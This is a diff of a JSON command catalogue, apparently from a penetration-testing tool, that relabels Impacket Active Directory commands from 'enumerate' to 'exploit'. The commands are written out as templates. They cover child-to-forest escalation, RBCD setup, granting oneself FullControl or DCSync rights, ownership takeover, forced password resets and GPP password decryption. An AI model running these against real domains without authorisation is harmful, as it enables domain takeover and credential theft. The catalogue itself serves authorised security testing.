@@ -101,25 +101,25 @@
       { "purpose": "Check a ticket before you use it", "template": "impacket-describeTicket <file>.ccache", "intent": "enumerate" }
     ]},
     { "name": "impacket-raiseChild", "description": "Child domain admin to forest root in one step (golden ticket with extra SID).", "commands": [
-      { "purpose": "From child-domain admin to Enterprise Admin", "template": "impacket-raiseChild <domain>/<user>:<pass>", "intent": "enumerate" }
+      { "purpose": "From child-domain admin to Enterprise Admin", "template": "impacket-raiseChild <domain>/<user>:<pass>", "intent": "exploit" }
     ]},
     { "name": "impacket-addcomputer", "description": "Adds a computer account you control (MachineAccountQuota, 10 by default).", "commands": [
-      { "purpose": "Add computer SLG$ for RBCD", "template": "impacket-addcomputer -computer-name 'SLG$' -computer-pass '<pass>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+      { "purpose": "Add computer SLG$ for RBCD", "template": "impacket-addcomputer -computer-name 'SLG$' -computer-pass '<pass>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" }
     ]},
     { "name": "impacket-rbcd", "description": "Reads and writes msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD", "commands": [
       { "purpose": "Write RBCD from a controlled account to the target", "template": "impacket-rbcd -delegate-from '<computer>$' -delegate-to '<target>$' -action write -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" }
     ]},
     { "name": "impacket-dacledit", "description": "Reads and writes ACEs on AD objects (GenericAll, WriteDacl abuse).", "commands": [
       { "purpose": "Read the rights a principal has on an object", "template": "impacket-dacledit -action read -target '<user>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" },
-      { "purpose": "Grant yourself FullControl on an object (needs WriteDacl)", "template": "impacket-dacledit -action write -rights FullControl -target '<user>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" },
-      { "purpose": "Grant yourself DCSync on the domain (needs WriteDacl on it)", "template": "impacket-dacledit -action write -rights DCSync -target-dn 'DC=<domain>,DC=<dc>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+      { "purpose": "Grant yourself FullControl on an object (needs WriteDacl)", "template": "impacket-dacledit -action write -rights FullControl -target '<user>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" },
+      { "purpose": "Grant yourself DCSync on the domain (needs WriteDacl on it)", "template": "impacket-dacledit -action write -rights DCSync -target-dn 'DC=<domain>,DC=<dc>' -principal '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" }
     ]},
     { "name": "impacket-owneredit", "description": "Changes the owner of an AD object (WriteOwner abuse).", "commands": [
-      { "purpose": "Make yourself the owner, then grant rights with dacledit", "template": "impacket-owneredit -action write -new-owner '<user>' -target '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "enumerate" }
+      { "purpose": "Make yourself the owner, then grant rights with dacledit", "template": "impacket-owneredit -action write -new-owner '<user>' -target '<user>' -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" }
     ]},
     { "name": "impacket-changepasswd", "description": "Changes or resets passwords over SMB, Kerberos or LDAP.", "commands": [
       { "purpose": "Set a new password when the old one has expired", "template": "impacket-changepasswd '<domain>/<user>:<pass>@{{TARGET}}' -newpass '<pass>'", "intent": "authenticate" },
-      { "purpose": "Reset another user's password (ForceChangePassword)", "template": "impacket-changepasswd '<domain>/<user>@{{TARGET}}' -reset -altuser '<user>' -altpass '<pass>' -newpass '<pass>'", "intent": "enumerate" }
+      { "purpose": "Reset another user's password (ForceChangePassword)", "template": "impacket-changepasswd '<domain>/<user>@{{TARGET}}' -reset -altuser '<user>' -altpass '<pass>' -newpass '<pass>'", "intent": "exploit" }
     ]},
     { "name": "impacket-Get-GPPPassword", "description": "Finds and decrypts Group Policy Preferences passwords (cpassword) in SYSVOL.", "commands": [
       { "purpose": "Search SYSVOL for cpassword and decrypt it", "template": "impacket-Get-GPPPassword <domain>/<user>:<pass>@{{TARGET}}", "intent": "dump" },
